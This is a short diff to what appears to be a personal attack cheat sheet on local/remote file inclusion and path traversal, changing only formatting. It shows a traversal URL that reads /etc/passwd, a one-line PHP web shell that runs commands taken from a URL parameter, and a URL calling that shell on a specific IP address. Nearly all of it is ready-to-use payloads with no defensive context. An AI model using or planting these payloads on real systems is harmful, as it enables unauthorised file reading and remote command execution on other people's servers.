@@ -1,4 +1,4 @@
-LFI/RFI / Path Traversal
+----< LFI/RFI / Path Traversal >----
 
 !-- 
 
@@ -15,14 +15,14 @@ else
 }
 ?>
 
-http://example.com/index.php?file=../../../../../etc/passwd 
+[+] http://example.com/index.php?file=../../../../../etc/passwd 
 
 !--
 
 
 <?php system($_GET["cmd"]); ?>
 
-http://54.233.190.10/index.php?cmd=ls%20-la
+[+] http://54.233.190.10/index.php?cmd=ls%20-la
 
 
 !--
